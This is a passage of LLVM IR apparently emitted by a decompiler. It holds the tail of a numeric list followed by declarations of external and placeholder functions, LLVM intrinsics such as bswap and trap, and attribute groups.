320, 307, 308, 309, 310, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 719, 720, 427, 428, 429, 430, 431, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 345, 346, 347, 348, 349, 350, 83, 84, 339, 340, 341, 342, 343, 344, 351, 39, 40, 41, 42, 43, 44, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 408, 409, 8, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 45, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 2, 505, 506, 507, 508, 509, 510, 511, 512, 46, 513, 47, 514, 48, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 49, 539, 50, 540, 51, 541, 52, 542, 543, 544, 545, 53, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 54, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 55, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 679, 680, 681, 3, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 779, 780, 781, 828, 829, 832, 830, 831, 833, 834, 835, 836, 837, 838, 839, 853, 854, 855, 856, 85, 857 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
